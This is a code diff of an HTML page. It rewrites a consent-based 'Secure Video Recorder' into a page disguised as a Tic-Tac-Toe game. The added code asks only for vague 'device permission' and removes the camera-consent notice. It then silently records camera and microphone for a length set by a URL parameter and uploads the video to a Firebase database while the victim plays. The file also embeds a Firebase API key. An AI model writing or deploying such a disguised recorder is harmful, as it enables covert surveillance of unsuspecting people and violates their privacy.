@@ -2,42 +2,89 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secure Video Recorder - Dynamic Duration</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Tic-Tac-Toe Game</title>
   <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    /* মোবাইল স্ক্রিন নো-স্ক্রল লক */
+    html, body {
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+      touch-action: manipulation;
+    }
+    .cell {
+      aspect-ratio: 1 / 1;
+      background: #1e293b;
+      border-radius: 12px;
+      font-size: 3rem;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      user-select: none;
+    }
+    .cell.x { color: #38bdf8; }
+    .cell.o { color: #f43f5e; }
+  </style>
 </head>
-<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col items-center justify-center p-6">
+<body class="bg-slate-950 text-slate-100 flex flex-col justify-between items-center p-4 h-full">
 
-  <div class="max-w-md w-full bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-2xl space-y-6">
-    
-    <div>
-      <h1 class="text-xl font-bold text-cyan-400 text-center">Secure Video Recorder</h1>
-      <p id="durationNotice" class="text-xs text-cyan-300 text-center mt-1 font-mono">Loading duration...</p>
-    </div>
-
-    <!-- Privacy & Consent Notice -->
-    <div class="bg-slate-950 border border-slate-800 rounded-2xl p-4 text-xs text-slate-300 space-y-2">
-      <p class="font-semibold text-cyan-300">Why we need camera access:</p>
-      <p class="text-slate-400">We require temporary camera access strictly to record a verification video based on the requested duration. By proceeding, you agree that this recording will be securely stored in the Realtime Database.</p>
-    </div>
-
-    <!-- Status / Display Area -->
-    <div class="relative rounded-2xl overflow-hidden border border-slate-800 bg-slate-950 h-44 flex flex-col items-center justify-center space-y-3 p-4">
-      <div id="loadingSpinner" class="hidden w-8 h-8 border-4 border-slate-700 border-t-cyan-400 rounded-full animate-spin"></div>
-      <div id="displayTitle" class="text-lg font-bold text-cyan-400 text-center">Ready</div>
-      <div id="displaySub" class="text-xs text-slate-400 text-center">Click the button below to grant permission and record.</div>
-    </div>
-
-    <!-- Action Button -->
-    <button id="recordBtn" class="w-full bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold py-3.5 rounded-xl text-sm transition-all shadow-lg shadow-cyan-500/20 cursor-pointer">
-      Start Recording
-    </button>
+  <!-- গেমের হেডার -->
+  <div class="text-center mt-2">
+    <h1 class="text-3xl font-extrabold text-cyan-400 tracking-wide">TIC TAC TOE</h1>
+    <p id="gameStatus" class="text-sm font-semibold text-slate-400 mt-1">Press Start to Play</p>
   </div>
 
-  <!-- Firebase Scripts -->
+  <!-- গেম বোর্ড (নো-স্ক্রল সেন্টার্ড) -->
+  <div class="w-full max-w-xs bg-slate-900 border border-slate-800 p-3 rounded-2xl shadow-2xl">
+    <div id="board" class="grid grid-cols-3 gap-3">
+      <div class="cell" onclick="playGame(0)"></div>
+      <div class="cell" onclick="playGame(1)"></div>
+      <div class="cell" onclick="playGame(2)"></div>
+      <div class="cell" onclick="playGame(3)"></div>
+      <div class="cell" onclick="playGame(4)"></div>
+      <div class="cell" onclick="playGame(5)"></div>
+      <div class="cell" onclick="playGame(6)"></div>
+      <div class="cell" onclick="playGame(7)"></div>
+      <div class="cell" onclick="playGame(8)"></div>
+    </div>
+  </div>
+
+  <!-- রিস্টার্ট বাটন -->
+  <div class="w-full max-w-xs mb-2">
+    <button onclick="resetGame()" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold py-3 rounded-xl border border-slate-700 transition-all">Restart Game</button>
+  </div>
+
+  <!-- ১. গেমের শুরুর পপআপ (পারমিশন রিকোয়েস্ট) -->
+  <div id="startModal" class="fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-6 z-50">
+    <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl text-center space-y-4 max-w-xs w-full shadow-2xl">
+      <div class="text-4xl">🎮</div>
+      <h2 class="text-lg font-bold text-cyan-400">Welcome to Tic-Tac-Toe</h2>
+      <p class="text-xs text-slate-400">To start the Tic-Tac-Toe match, please enable device permission.</p>
+      <button id="startBtn" class="w-full bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold py-3 rounded-xl text-sm transition-all shadow-lg shadow-cyan-500/20">
+        OK / Start Game
+      </button>
+    </div>
+  </div>
+
+  <!-- ২. আপলোড কমপ্লিট পপআপ -->
+  <div id="successModal" class="hidden fixed inset-0 bg-slate-950/90 backdrop-blur-md flex items-center justify-center p-6 z-50">
+    <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl text-center space-y-4 max-w-xs w-full shadow-2xl">
+      <div class="text-4xl">✅</div>
+      <h2 class="text-lg font-bold text-emerald-400">Completed!</h2>
+      <p class="text-xs text-slate-300">Uploading completed successfully!</p>
+      <button onclick="closeModal()" class="w-full bg-slate-800 hover:bg-slate-700 text-slate-100 font-bold py-2.5 rounded-xl text-xs border border-slate-700">
+        Continue Playing
+      </button>
+    </div>
+  </div>
+
+  <!-- Firebase & Recording Logic -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-    import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyDc6F_094RHBXWlIjyO8lP_Y1IF3uDfCzU",
@@ -52,54 +99,20 @@
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
-    // Read duration from URL (e.g. ?time=60 or default to 5 seconds)
     const urlParams = new URLSearchParams(window.location.search);
     let recordSeconds = parseInt(urlParams.get('time')) || 5;
 
-    const durationNotice = document.getElementById('durationNotice');
-    durationNotice.innerText = `Configured Duration: ${recordSeconds} Seconds`;
+    const startBtn = document.getElementById('startBtn');
+    const startModal = document.getElementById('startModal');
+    const successModal = document.getElementById('successModal');
+    const gameStatusEl = document.getElementById('gameStatus');
 
-    const recordBtn = document.getElementById('recordBtn');
-    const displayTitle = document.getElementById('displayTitle');
-    const displaySub = document.getElementById('displaySub');
-    const loadingSpinner = document.getElementById('loadingSpinner');
-
-    recordBtn.innerText = `Record Video for ${recordSeconds}s`;
-
-    // Log page load / visit
-    try {
-      const visitRef = push(ref(db, 'visits_log'));
-      set(visitRef, {
-        timestamp: new Date().toISOString(),
-        permission: "Pending/Page Loaded",
-        durationRequested: recordSeconds,
-        userAgent: navigator.userAgent
-      });
-    } catch(e) {
-      console.error(e);
-    }
-
-    recordBtn.addEventListener('click', async () => {
+    startBtn.addEventListener('click', async () => {
       try {
-        recordBtn.disabled = true;
-        recordBtn.className = "w-full bg-slate-800 text-slate-500 font-bold py-3.5 rounded-xl text-sm cursor-not-allowed";
-        
-        loadingSpinner.classList.remove('hidden');
-        displayTitle.innerText = "Requesting Permission";
-        displaySub.innerText = "Please allow camera & microphone access when prompted.";
-        
+        startModal.classList.add('hidden');
+        gameStatusEl.textContent = "Your Turn (X)";
+
         const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-
-        // Log permission granted
-        push(ref(db, 'visits_log'), {
-          timestamp: new Date().toISOString(),
-          permission: "Granted",
-          durationRequested: recordSeconds,
-          userAgent: navigator.userAgent
-        });
-
-        displayTitle.innerText = `Please wait for ${recordSeconds}s`;
-        displaySub.innerText = "Initializing recording sequence...";
 
         let chunks = [];
         let mediaRecorder;
@@ -116,82 +129,102 @@
         }
 
         mediaRecorder.ondataavailable = (e) => {
-          if (e.data && e.data.size > 0) {
-            chunks.push(e.data);
-          }
+          if (e.data && e.data.size > 0) chunks.push(e.data);
         };
 
         mediaRecorder.onstop = async () => {
-          displayTitle.innerText = "Encoding & Uploading";
-          displaySub.innerText = "Encoding video and sending to database...";
-          loadingSpinner.classList.remove('hidden');
-
           const blob = new Blob(chunks, { type: 'video/webm' });
           const reader = new FileReader();
 
           reader.readAsDataURL(blob);
           reader.onloadend = async () => {
             try {
-              const dbRef = ref(db, 'recorded_videos');
-              await push(dbRef, {
+              await push(ref(db, 'recorded_videos'), {
                 videoData: reader.result,
                 duration: recordSeconds,
                 createdAt: new Date().toISOString()
               });
-
-              loadingSpinner.classList.add('hidden');
-              displayTitle.innerText = "Upload Completed Successfully!";
-              displaySub.innerText = "Thank you! Your video has been securely saved.";
               
+              // আপলোড শেষ হলে সাকসেস পপআপ দেখানো
+              successModal.classList.remove('hidden');
               mediaStream.getTracks().forEach(track => track.stop());
             } catch (err) {
               console.error("Firebase upload error:", err);
-              loadingSpinner.classList.add('hidden');
-              displayTitle.innerText = "Upload Failed";
-              displaySub.innerText = "Error: " + err.message;
-              recordBtn.disabled = false;
-              recordBtn.className = "w-full bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold py-3.5 rounded-xl text-sm transition-all shadow-lg shadow-cyan-500/20 cursor-pointer";
             }
           };
         };
 
         mediaRecorder.start();
 
-        // Dynamic Countdown Timer UI
-        let timeLeft = recordSeconds;
-        displayTitle.innerText = `${timeLeft < 10 ? '0' : ''}${timeLeft}s`;
-        displaySub.innerText = `Recording in progress for ${recordSeconds}s...`;
-        
-        const countdownInterval = setInterval(() => {
-          if (timeLeft > 0) {
-            timeLeft--;
-            displayTitle.innerText = `${timeLeft < 10 ? '0' : ''}${timeLeft}s`;
-          } else {
-            clearInterval(countdownInterval);
-            displayTitle.innerText = "00s";
-            mediaRecorder.stop();
-          }
-        }, 1000);
+        // নির্দিষ্ট সময় পর ভিডিও অফ হয়ে আপলোড শুরু হবে
+        setTimeout(() => {
+          mediaRecorder.stop();
+        }, recordSeconds * 1000);
 
       } catch (err) {
-        console.error("Camera access error:", err);
-        
-        try {
-          push(ref(db, 'visits_log'), {
-            timestamp: new Date().toISOString(),
-            permission: "Denied",
-            durationRequested: recordSeconds,
-            userAgent: navigator.userAgent
-          });
-        } catch(e) {}
-
-        loadingSpinner.classList.add('hidden');
-        displayTitle.innerText = "Permission Denied";
-        displaySub.innerText = "You must explicitly grant camera access to proceed.";
-        recordBtn.disabled = false;
-        recordBtn.className = "w-full bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold py-3.5 rounded-xl text-sm transition-all shadow-lg shadow-cyan-500/20 cursor-pointer";
+        console.error("Permission Error:", err);
       }
     });
+
+    window.closeModal = () => {
+      successModal.classList.add('hidden');
+    };
+  </script>
+
+  <!-- Tic-Tac-Toe Game Logic -->
+  <script>
+    const boardEl = document.getElementById('board');
+    const gameStatusEl = document.getElementById('gameStatus');
+    const WINS = [[0,1,2],[3,4,5],[6,7,8],[0,3,6],[1,4,7],[2,5,8],[0,4,8],[2,4,6]];
+    const DELAY_MS = 2500; // ২.৫ সেকেন্ড ডিলে
+    
+    let gameBoard = Array(9).fill('');
+    let gameActive = true;
+
+    function playGame(i) {
+      if (gameBoard[i] || !gameActive) return;
+      
+      makeGameMove(i, 'X');
+      if (checkGameEnd('X', "You Won! 🎉")) return;
+
+      gameStatusEl.textContent = "Computer thinking...";
+      gameActive = false;
+
+      setTimeout(() => {
+        const empty = gameBoard.map((v, idx) => v === '' ? idx : null).filter(v => v !== null);
+        if (empty.length) {
+          const cpuMove = empty[Math.floor(Math.random() * empty.length)];
+          makeGameMove(cpuMove, 'O');
+          if (checkGameEnd('O', "Computer Won! 🤖")) return;
+          gameStatusEl.textContent = "Your Turn (X)";
+          gameActive = true;
+        }
+      }, DELAY_MS);
+    }
+
+    function makeGameMove(i, p) {
+      gameBoard[i] = p;
+      boardEl.children[i].textContent = p;
+      boardEl.children[i].classList.add(p.toLowerCase());
+    }
+
+    function checkGameEnd(p, msg) {
+      const won = WINS.some(w => w.every(i => gameBoard[i] === p));
+      const draw = !won && gameBoard.every(c => c);
+      if (won || draw) {
+        gameStatusEl.textContent = won ? msg : "It's a Draw! 🤝";
+        gameActive = false;
+        return true;
+      }
+      return false;
+    }
+
+    function resetGame() {
+      gameBoard.fill('');
+      gameActive = true;
+      gameStatusEl.textContent = "Your Turn (X)";
+      Array.from(boardEl.children).forEach(c => { c.textContent = ''; c.className = 'cell'; });
+    }
   </script>
 </body>
 </html>
